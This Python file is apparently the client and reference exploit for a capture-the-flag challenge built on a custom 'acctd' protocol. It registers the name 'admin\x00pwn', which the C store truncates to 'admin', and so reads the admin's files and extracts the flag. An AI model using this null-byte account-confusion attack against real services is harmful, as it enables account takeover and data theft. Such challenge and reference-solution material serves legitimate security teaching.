#!/usr/bin/env python3
"""A client for the acctd protocol, and the reference exploit.

    client.py HOST PORT        solve a remote instance
    client.py -- CMD [ARGS]    solve a local instance spoken on CMD's stdio

The protocol is length-prefixed binary (see src/main.rs): a request is an
opcode byte then zero or more u16-length-prefixed fields; a response is a
status byte, a u16 length, and that many bytes.

Standard library only.
"""
import socket
import struct
import subprocess
import sys

REGISTER, LOGIN, WHOAMI, LISTUSERS, LISTFILES, READFILE, WRITEFILE = range(1, 8)


class Conn:
    """One acctd connection, over a socket or a subprocess's stdio."""

    def __init__(self, write, read, close):
        self._write, self._read, self._close = write, read, close
        self.greeting = self.recv()          # the server speaks first

    @classmethod
    def tcp(cls, host, port):
        s = socket.create_connection((host, port))
        rf = s.makefile("rb")
        return cls(lambda b: (s.sendall(b)), rf.read, s.close)

    @classmethod
    def spawn(cls, argv):
        p = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

        def write(b):
            p.stdin.write(b)
            p.stdin.flush()
        return cls(write, p.stdout.read, lambda: (p.stdin.close(), p.terminate()))

    def _recv_exact(self, n):
        data = self._read(n)
        if len(data) != n:
            raise EOFError("connection closed")
        return data

    def request(self, opcode, *fields):
        msg = bytes([opcode])
        for f in fields:
            msg += struct.pack(">H", len(f)) + f
        self._write(msg)
        return self.recv()

    def recv(self):
        status = self._recv_exact(1)[0]
        (length,) = struct.unpack(">H", self._recv_exact(2))
        return status, self._recv_exact(length)

    def close(self):
        self._close()


def solve(conn):
    print("greeting:", conn.greeting[1].decode(errors="replace"))

    # Who is there to target?
    status, users = conn.request(LISTUSERS)
    print("users:", users.split())

    # The confusion: register a name that is distinct to Rust (admin\x00pwn)
    # but truncates to "admin" once the C store turns it into a C string.
    handle = b"admin\x00pwn"
    status, msg = conn.request(REGISTER, handle, b"pw")
    assert status == 0, msg
    status, token = conn.request(LOGIN, handle, b"pw")
    assert status == 0, token

    status, who = conn.request(WHOAMI, token)
    print("logged in as:", who)          # admin\x00pwn, our own account

    status, files = conn.request(LISTFILES, token)   # ...but these are admin's
    assert status == 0, files
    names = files.split()
    print("files visible:", names)

    for name in names:
        status, data = conn.request(READFILE, token, name)
        if status == 0 and b"pdx{" in data:
            flag = data[data.index(b"pdx{"):].split(b"}")[0] + b"}"
            print("FLAG:", flag.decode())
            return flag
    raise SystemExit("no flag found; files were " + repr(names))


def main():
    args = sys.argv[1:]
    if len(args) >= 2 and args[0] == "--":
        conn = Conn.spawn(args[1:])
    elif len(args) == 2:
        conn = Conn.tcp(args[0], int(args[1]))
    else:
        raise SystemExit(__doc__)
    try:
        solve(conn)
    finally:
        conn.close()


if __name__ == "__main__":
    main()
